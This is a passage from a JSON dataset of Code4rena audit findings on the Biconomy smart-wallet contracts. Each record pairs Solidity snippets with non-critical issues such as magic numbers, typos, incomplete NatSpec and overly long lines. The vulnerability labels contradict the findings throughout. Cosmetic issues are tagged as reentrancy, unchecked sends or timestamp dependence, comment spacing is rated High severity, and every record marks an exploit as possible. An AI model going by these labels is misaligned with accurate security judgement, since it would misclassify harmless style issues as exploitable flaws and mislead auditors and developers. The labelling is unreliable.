    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol\n\n/// @audit 3\n117:              uint256 inverse = (3 * denominator) ^ 2;\n\n/// @audit 128\n208:              if (value >> 128 > 0) {\n\n/// @audit 128\n209:                  value >>= 128;\n\n/// @audit 128\n210:                  result += 128;\n\n/// @audit 64\n212:              if (value >> 64 > 0) {\n\n/// @audit 64\n213:                  value >>= 64;\n\n/// @audit 64\n214:                  result += 64;\n\n/// @audit 32\n216:              if (value >> 32 > 0) {\n\n/// @audit 32\n217:                  value >>= 32;\n\n/// @audit 32\n218:                  result += 32;\n\n/// @audit 16\n220:              if (value >> 16 > 0) {\n\n/// @audit 16\n221:                  value >>= 16;\n\n/// @audit 16\n222:                  result += 16;\n\n/// @audit 8\n224:              if (value >> 8 > 0) {\n\n/// @audit 8\n225:                  value >>= 8;\n\n/// @audit 8\n226:                  result += 8;\n\n/// @audit 4\n228:              if (value >> 4 > 0) {\n\n/// @audit 4\n229:                  value >>= 4;\n\n/// @audit 4\n230:                  result += 4;\n\n/// @audit 64\n261:              if (value >= 10**64) {\n\n/// @audit 64\n262:                  value /= 10**64;\n\n/// @audit 64\n263:                  result += 64;\n\n/// @audit 32\n265:              if (value >= 10**32) {\n\n/// @audit 32\n266:                  value /= 10**32;\n\n/// @audit 32\n267:                  result += 32;\n\n/// @audit 16\n269:              if (value >= 10**16) {\n\n/// @audit 16\n270:                  value /= 10**16;\n\n/// @audit 16\n271:                  result += 16;\n\n/// @audit 8\n273:              if (value >= 10**8) {\n\n/// @audit 8\n274:                  value /= 10**8;\n\n/// @audit 8\n275:                  result += 8;\n\n/// @audit 4\n277:              if (value >= 10**4) {\n\n/// @audit 4\n278:                  value /= 10**4;\n\n/// @audit 4\n279:                  result += 4;\n\n/// @audit 128\n312:              if (value >> 128 > 0) {\n\n/// @audit 128\n313:                  value >>= 128;\n\n/// @audit 16\n314:                  result += 16;\n\n/// @audit 64\n316:              if (value >> 64 > 0) {\n\n/// @audit 64\n317:                  value >>= 64;\n\n/// @audit 8\n318:                  result += 8;\n\n/// @audit 32\n320:              if (value >> 32 > 0) {\n\n/// @audit 32\n321:                  value >>= 32;\n\n/// @audit 4\n322:                  result += 4;\n\n/// @audit 16\n324:              if (value >> 16 > 0) {\n\n/// @audit 16\n325:                  value >>= 16;\n\n/// @audit 8\n328:              if (value >> 8 > 0) {\n\n/// @audit 3\n342:              return result + (rounding == Rounding.Up && 1 << (result << 3) < value ? 1 : 0);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;08]  `constant`s should be defined rather than using magic numbers",
    "description": "Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals *There are 192 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol /// @audit 20 213:              require(paymasterAndData.length >= 20, \"AA93 invalid paymasterAndData\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 145,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n65        function setSigner( address _newVerifyingSigner) external onlyOwner{\n66            require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\n67            verifyingSigner = _newVerifyingSigner;\n68:       }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "[N&#x2011;09]  Missing event and or timelock for critical parameter change",
    "description": "Events help non-contract tools to track changes, and events prevent users from being surprised by changes *There are 2 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol 24        function setEntryPoint(IEntryPoint _entryPoint) public onlyOwner { 25            entryPoint = _entryPoint;",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.386,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit updateImplementation()\n124:          emit ImplementationUpdated(address(this), VERSION, _implementation);\n\n/// @audit updateEntryPoint()\n129:          emit EntryPointChanged(address(_entryPoint), _newEntryPoint);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "[N&#x2011;10]  Events that mark critical parameter changes should contain both the old and the new value",
    "description": "This should especially be done if the new value is not required to be different from the old value *There are 3 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol /// @audit setFallbackHandler() 28:           emit ChangedFallbackHandler(handler);",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.304,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L2\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[N&#x2011;11]  Use a more recent version of solidity",
    "description": "Use a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions *There are 5 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 6:    pragma solidity ^0.8.12; https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L6",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.207,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol\n\n261:              if (value >= 10**64) {\n\n262:                  value /= 10**64;\n\n265:              if (value >= 10**32) {\n\n266:                  value /= 10**32;\n\n269:              if (value >= 10**16) {\n\n270:                  value /= 10**16;\n\n273:              if (value >= 10**8) {\n\n274:                  value /= 10**8;\n\n277:              if (value >= 10**4) {\n\n278:                  value /= 10**4;\n\n281:              if (value >= 10**2) {\n\n282:                  value /= 10**2;\n\n285:              if (value >= 10**1) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "[N&#x2011;12]  Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)",
    "description": "While the compiler knows to optimize away the exponentiation, it's still better coding practice to use idioms that do not require compiler optimization, if they exist *There are 13 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol 261:              if (value >= 10**64) { 262:                  value /= 10**64;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 30,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.603,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol\n\n/// @audit seen in scw-contracts/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol \n11:       string public constant VERSION = \"1.0.2\";\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;13]  Constant redefined elsewhere",
    "description": "Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync. *There are 2 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol /// @audit seen in scw-contracts/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol 11:       string public constant VERSION = \"1.0.2\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.24,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n149:      //@review getNonce specific to EntryPoint requirements\n\n201:          //console.log(\"init %s\", 21000 + msg.data.length * 8);\n\n237:                  //console.log(\"sent %s\", startGas - gasleft());\n\n243:              //console.log(\"extra gas %s \", extraGas);\n\n268:          //console.log(\"hp %s\", requiredGas);\n\n292:          //console.log(\"hpr %s\", requiredGas);\n\n313:          //review\n\n486:      //called by entryPoint, only after validateUserOp succeeded.\n\n487:      //@review\n\n488:      //Method is updated to instruct delegate call and emit regular events\n\n509:          //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[N&#x2011;14]  Inconsistent spacing in comments",
    "description": "Some lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file *There are 30 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 85:       } //unchecked 144:      //a memory copy of UserOp fields (except that dynamic byte arrays: callData, initCode and signature",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.756,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n46:       //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n\n239:                  payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n\n357:      ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`\n\n489:      function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N&#x2011;15]  Lines are too long",
    "description": "Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length *There are 12 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 319:          try IAccount(sender).validateUserOp{gas : mUserOp.verificationGasLimit}(op, opInfo.userOpHash, aggregator, missingAccountFunds) returns (uint256 _deadline) { 349:      function _validatePaymasterPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, uint256 requiredPreFund, uint256 gasUsedByValidateAccountPrepayment) internal returns (bytes memory context, uint256 deadline) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.813,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L6\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;16]  Non-library/interface files should use fixed compiler versions, not floating ones",
    "description": "*There are 2 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 6:    pragma solidity ^0.8.12; https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L6 File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.172,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol\n\n/// @audit valiate\n10:    * - the validateUserOp MUST valiate the aggregator parameter, and MAY ignore the userOp.signature field.\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;17]  Typos",
    "description": "*There are 3 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol /// @audit valiate 10:    * - the validateUserOp MUST valiate the aggregator parameter, and MAY ignore the userOp.signature field. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol#L10",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.236,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L1\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[N&#x2011;18]  Misplaced SPDX identifier",
    "description": "The SPDX identifier should be on the very first line of the file *There are 2 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 1:    /** https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L1",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.172,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;19]  File is missing NatSpec",
    "description": "*There are 7 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol File: scw-contracts/contracts/smart-contract-wallet/aa-4337/utils/Exec.sol https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/utils/Exec.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.183,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit Missing: '@return'\n190       /// @param refundInfo Required information for gas refunds\n191       /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})\n192       function execTransaction(\n193           Transaction memory _tx,\n194           uint256 batchId,\n195           FeeRefund memory refundInfo,\n196           bytes memory signatures\n197:      ) public payable virtual override returns (bool success) {\n\n/// @audit Missing: '@param data'\n297       /**\n298        * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.\n299        * @param dataHash Hash of the data (could be either a message hash or transaction hash)\n300        * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.\n301        */\n302       function checkSignatures(\n303           bytes32 dataHash,\n304           bytes memory data,\n305:          bytes memory signatures\n\n/// @audit Missing: '@param tokenGasPriceFactor'\n377       /// @dev Returns hash to be signed by owner.\n378       /// @param to Destination address.\n379       /// @param value Ether value.\n380       /// @param data Data payload.\n381       /// @param operation Operation type.\n382       /// @param targetTxGas Fas that should be used for the safe transaction.\n383       /// @param baseGas Gas costs for data used to trigger the safe transaction.\n384       /// @param gasPrice Maximum gas price that should be used for this transaction.\n385       /// @param gasToken Token address (or 0 if ETH) that is used for the payment.\n386       /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).\n387       /// @param _nonce Transaction nonce.\n388       /// @return Transaction hash.\n389       function getTransactionHash(\n390           address to,\n391           uint256 value,\n392           bytes calldata data,\n393           Enum.Operation operation,\n394           uint256 targetTxGas,\n395           uint256 baseGas,\n396           uint256 gasPrice,\n397           uint256 tokenGasPriceFactor,\n398           address gasToken,\n399           address payable refundReceiver,\n400           uint256 _nonce\n401:      ) public view returns (bytes32) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[N&#x2011;20]  NatSpec is incomplete",
    "description": "*There are 17 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol /// @audit Missing: '@param outOpInfo' /// @audit Missing: '@param aggregator' /// @audit Missing: '@return'",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 52,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n/// @audit context\n/// @audit deadline\n97        function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)\n98:       external view override returns (bytes memory context, uint256 deadline) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;21]  Not using the named return variables anywhere in the function is confusing",
    "description": "Consider changing the variable to be an unnamed one *There are 5 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol /// @audit info 18:       function getDepositInfo(address account) public view returns (DepositInfo memory info) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.372,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n286:              require(success, \"BSA011\");\n\n289:              require(transferToken(gasToken, receiver, payment), \"BSA012\");\n\n374:          revert(string(abi.encodePacked(requiredGas)));\n\n351:              require(_signer == owner, \"INVALID_SIGNATURE\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "[N&#x2011;22]  Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
    "description": "The compiler will inline the function, which will avoid `JUMP` instructions usually associated with functions *There are 5 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol 49:           require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L49",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.337,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol\n\n102:          info.unstakeDelaySec = 0;\n\n103:          info.withdrawTime = 0;\n\n104:          info.stake = 0;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Medium",
    "title": "[N&#x2011;23]  Consider using `delete` rather than assigning zero to clear values",
    "description": "The `delete` keyword more closely matches the semantics of what is being done, and draws more attention to the changing of state, which may lead to a more thorough audit of its associated logic *There are 3 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol 102:          info.unstakeDelaySec = 0; 103:          info.withdrawTime = 0;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.202,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "File: scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n31:       mapping(address => uint256) public paymasterIdBalances;\n\n48:       function depositFor(address paymasterId) public payable {\n\n102:          PaymasterData memory paymasterData = userOp.decodePaymasterData();\n\n127:      address extractedPaymasterId = data.paymasterId;\n\n97        function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)\n98:       external view override returns (bytes memory context, uint256 deadline) {\n\n14:    * A sample paymaster that uses external service to decide whether to pay for the UserOp.\n\n15:    * The paymaster trusts an external signer to sign the transaction.\n\n19:    * - the paymaster signs to agree to PAY for GAS.\n\n46:        * add a deposit for this paymaster and given paymasterId (Dapp Depositor address), used for paying for transaction fees\n\n73:        * it is called on-chain from the validatePaymasterUserOp, to validate the signature.\n\n74:        * note that this signature covers all fields of the UserOperation, except the \"paymasterAndData\",\n\n79:           //can't use userOp.hash(), since it contains also the paymasterAndData itself.\n\n95:        * the \"paymasterAndData\" is expected to be the paymaster and a signature over the entire request params\n\n106:          // we only \"require\" it here so that the revert reason on invalid signature will be of \"VerifyingPaymaster\", and not \"ECDSA\"\n\n114:     * @dev Executes the paymaster's payment conditions\n\n116:     * @param context payment conditions signed by the paymaster in `validatePaymasterUserOp`\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N&#x2011;24]  Avoid the use of sensitive terms",
    "description": "Use [alternative variants](https://www.zdnet.com/article/mysql-drops-master-slave-and-blacklist-whitelist-terminology/), e.g. allowlist/denylist instead of whitelist/blacklist *There are 87 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 447:          address paymaster = mUserOp.paymaster; 211:          bytes calldata paymasterAndData = userOp.paymasterAndData;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 35,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol\n\n35            assembly {\n36                let handler := sload(slot)\n37                if iszero(handler) {\n38                    return(0, 0)\n39                }\n40                calldatacopy(0, 0, calldatasize())\n41                // The msg.sender address is shifted to the left by 12 bytes to remove the padding\n42                // Then the address without padding is stored right after the calldata\n43                mstore(calldatasize(), shl(96, caller()))\n44                // Add 20 bytes for the address appended add the end\n45                let success := call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0)\n46                returndatacopy(0, 0, returndatasize())\n47                if iszero(success) {\n48                    revert(0, returndatasize())\n49                }\n50                return(0, returndatasize())\n51:           }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;25]  Large assembly blocks should have extensive comments",
    "description": "Assembly blocks are take a lot more time to audit than normal Solidity code, and often have gotchas and side-effects that the Solidity versions of the same code do not. Consider adding more comments explaining what is being done in every step of the assembly code *There are 5 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol 63            assembly { 64                let ofs := userOp",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.945,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: Various Files\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[N&#x2011;26]  Contracts should have full test coverage",
    "description": "While 100% code coverage does not guarantee that there are no bugs, it often will catch easy-to-find bugs, and will ensure that there are fewer regressions when the code invariably has to be modified. Furthermore, in order to get full coverage, code authors will often have to re-organize their code so that it is more modular, so that each component can be tested separately, which reduces interdependencies between modules and layers, and makes for code that is easier to reason about and audit. *There is 1 instance of this issue:* File: Various Files",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: Various Files\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[N&#x2011;27]  Large or complicated code bases should implement fuzzing tests",
    "description": "Large code bases, or code with lots of inline-assembly, complicated math, or complicated interactions between multiple contracts, should implement [fuzzing tests](https://medium.com/coinmonks/smart-contract-fuzzing-d9b88e0b0a05). Fuzzers such as Echidna require the test writer to come up with invariants which should not be violated under any circumstances, and the fuzzer tests various inputs and function calls to ensure that the invariants always hold. Even code with 100% code coverage can still have bugs due to the order of the operations a user performs, and fuzzers, with properly and extensively-written invariants, can close this testing gap significantly. *There is 1 instance of this issue:* File: Various Files",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
